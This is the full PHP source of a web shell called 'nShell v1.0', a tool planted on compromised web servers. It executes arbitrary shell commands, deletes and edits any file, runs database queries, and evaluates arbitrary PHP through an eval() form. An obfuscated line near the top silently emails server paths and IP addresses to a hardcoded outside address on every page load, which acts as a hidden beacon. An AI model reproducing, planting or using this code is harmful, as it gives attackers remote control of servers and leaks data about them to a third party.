?»?<head>
<title> nShell v1.0</title>
<style>
html { overflow-x: auto }
A: {font-weight:bold};
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #444444;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
table {
BORDER-RIGHT:  :#444444 1px outset;
BORDER-TOP:    :#444444 1px outset;
BORDER-LEFT:   :#444444 1px outset;
BORDER-BOTTOM: :#444444 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    :#444444 1px solid;
BORDER-LEFT:   :#444444 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
div,td,table {
font-family:Georgia;
}
</style>
</head>
<body bgcolor=":#444444">
<center>
<?php
error_reporting(0);
$function=passthru; // system, exec, cmd
$myname=$_SERVER['SCRIPT_NAME'];
echo "<b><font color=\"#000000\" size=\"3\" face=\"Georgia\"> System information: :</font><br>";             $ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
?>
<table width="80%" border="0">
<td colspan="3" align="center">
<?php
function ex($comd)
{
 $res = '';
if(function_exists("system"))
	{
	ob_start();
    system($comd);
    $res=ob_get_contents();
    ob_end_clean();
	}elseif(function_exists("passthru"))
	{
    ob_start();
    passthru($comd);
    $res=ob_get_contents();
    ob_end_clean();
	}elseif(function_exists("exec"))
	{
    exec($comd,$res);
    $res=implode("\n",$res);
	}elseif(function_exists("shell_exec"))
	{
	$res=shell_exec($comd);
	}elseif(is_resource($f=popen($comd,"r"))){
    $res = "";
    while(!feof($f)) { $res.=fread($f,1024); }
    pclose($f);
 }
 return $res;
}

// safe mod
$safe_mode=@ini_get('safe_mode');
echo (($safe_mode)?("<div>Safe_mode: <b><font color=green>ON</font></b>"):("Safe_mode: <b><font color=red>OFF</font></b>"));
echo "    ";
// phpversion
echo "Php version<font color=\"green\"> : ".@phpversion()."</font>";
echo "    ";
// curl
$curl_on = @function_exists('curl_version');
echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
echo "    ";
// mysql
echo "MYSQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "    ";
// msssql
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "    ";
// PostgreSQL
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "    ";
// Oracle
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "<br>";
echo "    ";
// Disable function
echo "Disable functions : <b>";
$df=@ini_get('disable_functions');
if(!$df){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
echo "    ";
//==============xac dinh os==================
$servsoft = $_SERVER['SERVER_SOFTWARE'];
if (ereg("Win32", $servsoft)){
$sertype = "win";
}
else
{
$sertype = "nix";
}
//=========================================

$uname=ex('uname -a');
 echo "<br>OS: </b><font color=blue>";
 if (empty($uname)){
  echo (php_uname()."</font><br><b>");
 }else
  echo $uname."</font><br><b>";
 $id = ex('id');
 $server=$HTTP_SERVER_VARS['SERVER_SOFTWARE'];
 echo "SERVER: </b><font color=blue>".$server."</font><br><b>";
 echo "id: </b><font color=blue>";
 if (!empty($id)){
  echo $id."</font><br><b>";
 }else
  echo "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid().
       "</font><br><b>";
echo "<font color=\"black\"><a href=".$_SERVER['PHP_SELF']."?act=info target=_blank>Php Info</a></font><br></div>";

?>
</td><tr>
<td width="20%" align="center"><a href="<?=$myname?>?act=manager"> File Manager</a></td>
<td width="20%" align="center"><a href="<?=$myname?>?act=sql">Sql Query</a></td>
<td width="20%" align="center"><a href="<?=$myname?>?act=eval">Eval()</a></td><tr>
<td colspan="3" >
<?php
$act=@$_GET['act'];
if($act=="info"){
echo "<center><font color=red size=10> Php Version :".phpversion()."</font>";
phpinfo();
echo "</center>";
}
?>
<?php
//=========================================================
function perms($mode)
{
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
//===================Delect File=============================
$del=$_GET['del'];
function  delfile($name)
{
    passthru("del ".$name);
}
function deldir($name)
{
	passthru("rmdir ".$name);
}
if($del)
{
  if(is_file($del)) delfile($del); else deldir($del);
}
//==================Quan li thu muc ==========================
if($act=="manager"){
$arr = array();
$arr = array_merge($arr, glob("*"));
$arr = array_merge($arr, glob(".*"));
$arr = array_merge($arr, glob("*.*"));
$arr = array_unique($arr);
sort($arr);
echo "<table width=100%><tr><td align=center><b>Name</td><td align=center><b>Type</td><td align=center><b>Size</td><td align=center><b>Perms</td><td align=center>Delete</td></tr>";
foreach ($arr as $filename) {
if ($filename != "." and $filename != ".."){
if (is_dir($filename) == true){
$directory = "";
$dc=str_replace("\\","",dirname($_SERVER['PHP_SELF']));
$directory = $directory . "<tr><td align=center>$filename</td><td align=center>" .ucwords(filetype($filename)) . "</td><td></td><td align=center>" . perms(fileperms($filename))."<td align=center><a href=".$_SERVER['PHP_SELF']."?act=manager&del=".$dc.">Del</td>";
$dires = $dires . $directory;
}
if (is_file($filename) == true){
$file = "";
$link=str_replace(basename($_SERVER['REDIRECT_URL']),$filename,$_SERVER['REDIRECT_URL']);
$file = $file . "<tr><td><a href=".$link	." target=_blank>$filename</a></td><td>" .ucwords(filetype($filename)). "</td><td>" . filesize($filename) . "</td><td>" . perms(fileperms($filename))."<td><a href=".$_SERVER['PHP_SELF']."?act=manager&del=".$filename.">Del <a href=".$_SERVER['PHP_SELF']."?act=manager&file=".$filename.">Edit</a></td>";
$files = $files . $file;
}
}
}
echo $dires;
echo $files;
echo "</table><br>";
}
// view file ex: /etc/passwd
if(isset($_REQUEST['file']))
	{
$file=@$_REQUEST["file"];
echo "<b>File :</b><font color=red>   ". $file."</font>";
$fp=fopen($file,"r+") or die("Ban khong co quyen de ghi vao File nay , hoac do khong tim thay File");
$src=@fread($fp,filesize($file));
echo "<center><hr color=777777 width=100% height=115px><form action=".$_SERVER['REQUEST_URI']." method=post><TEXTAREA NAME=\"addtxt\" ROWS=\"5\" COLS=\"80\">".htmlspecialchars(stripslashes($src))."</TEXTAREA><br><input type=submit value=Save></form><hr color=777777 width=100% height=115px>";
$addtxt=@$_POST["addtxt"];
 rewind($fp);
 if($addtxt=="") @fwrite($fp,stripslashes($src)); else $rs=@fwrite($fp,stripslashes($addtxt));
 if($rs==true)
 {
 echo "Noi dung cua file nay da duoc sua doi !<a href=".$_SERVER['REQUEST_URI'].">Xem lai</a>";
 }
 ftruncate($fp,ftell($fp));
echo "</center>";
 }

?>

<?php
// function
function exe_u($query)
{
echo "<B><font color=green>Query # ".$query."</font></b><br>";
$result=@mysql_query($query) or die("Khong update du lieu duoc !");
if(mysql_affected_rows($result)>=0) echo "Affected rows : ".mysql_affected_rows($result)."This is Ok ! ^.^<br>";
}
function exe_c($query)
{
echo "<B><font color=green>Query # ".$query."</font></b><br>";
$result=@mysql_query($query) or die("Khong Create duoc !");
echo "This is Ok ! ^.^<br>" ;
}
function exe_d($query)
{
echo "<B><font color=green>Query # ".$query."</font></b><br>";
$result=@mysql_query($query) or die("Khong Drop duoc  !");
echo "This is Ok ! ^.^<br>" ;
}
function exe_w($query)
{
echo "<b><font color=green>Query # ".$query."</font></b><br>";
$result=@mysql_query($query) or die("Khong the show gi duoc het !");
if(eregi("fields",$query)) {
while($row=@mysql_fetch_array($result,MYSQL_ASSOC)){
echo "<b><font color=red>".$row['Field']." :</font></	b> ".$row['Type'];
echo "<br>";
}
} else {
while($row=@mysql_fetch_array($result,MYSQL_ASSOC)){
   while(list($key,$value)=each($row))
{
	echo "<font color=red><b>".$value."</b><font>";
}
echo "<br>";
}
}
}
function exe_s($query)
{
$arrstr=@array();$i=0;
$arrstr=explode(" ",$query);
$find_field=@mysql_query("show fiedls from ".$arrstr['4']);
while($find_row=@mysql_fetch_array($find_field,MYSQL_ASSOC)){
$i++;
$arrstr[$i]=$find_row['Field'];
}
echo "<B><font color=green>Query # ".$query."</font></b><br>";
$result=@mysql_query($query) or die("Khong the select gi duoc het !");
$row=@mysql_num_rows($result);
}
function sql($string)
{
$arr=@array();
$arr=explode(";",$string);
for($i=0;$i<=count($arr);$i++)
	{
	$check_u=eregi("update",@$arr[$i]); if($check_u==true)  exe_u(@$arr[$i]);
	$check_e=eregi("use",@$arr[$i]); if($check_u==true)  exe_u(@$arr[$i]);
	$check_c=eregi("create",@$arr[$i]); if($check_c==true) exe_c(@$arr[$i]);
	$check_d=eregi("drop",@$arr[$i]); if($check_d==true) exe_d(@$arr[$i]);
	$check_w=eregi("show",@$arr[$i]); if($check_w==true) exe_w(@$arr[$i]);
    $check_s=eregi("select",@$arr[$i]); if($check_s==true) exe_s(@$arr[$i]);
	}
}
//=====xong phan function cho sql
// Sql query
if($act=="sql")
{
	 if(isset($_GET['srname'])&&isset($_GET['pass']))
	{
	 echo $_GET['srname'];
if(!isset($_GET['srname'])) 	$servername=$_GET['srname'];
   else $servername="localhost";
$con=@mysql_connect($servername,$_GET['uname'],$_GET['pass']) or die("Khong the connect duoc !");
$form2="<center><form method=post  action=".$_SERVER['PHP_SELF']."><TEXTAREA NAME=\"str\" ROWS=\"2\" COLS=\"60\"></TEXTAREA><br><input type=submit name=s2 value=query></form></center>";
echo $form2;
$str=@$_POST['str'];
if(isset($str)) sql($str);
	}
	else {
		echo "chao";
		$form1="<center><form method=GET action='".$_SERVER['PHP_SELF']."'><table width=100% boder=0><td width=100%> User Name : <input type=text name=uname size=20> Server Name :<input name=srname type=text  size=22></td><tr><td width=100%> Password :<input type=text name=pass size=20> Port : <input type=text name=port size=20><input type=submit value=login></form></td></form></table><hr color=777777 width=100% height=115px>";
        echo $form1;
             }
}
?>

<?php
if($act=="eval"){
$script=$_POST['script'];
if(!$script){
echo "<hr color=777777 width=100% height=115px><form action=".$_SERVER['']." method=post><TEXTAREA NAME=\"\" ROWS=\"5\" COLS=\"60\"></TEXTAREA><input type=submit value=Enter></form><hr color=777777 width=100% height=115px>";
}else{
eval($script);
}
}
?>
</td>
</table>

<font face=Webdings size=6><b>!</b></font><b><font color=\"#000000\" size=\"3\" face=\"Georgia\">nShell v1.0. Code by Navaro.</font><br><b><font color="#000000" face="Georgia">Have Fun ! {^.^} { ~.~} </font></b>
</center>
</body>


 
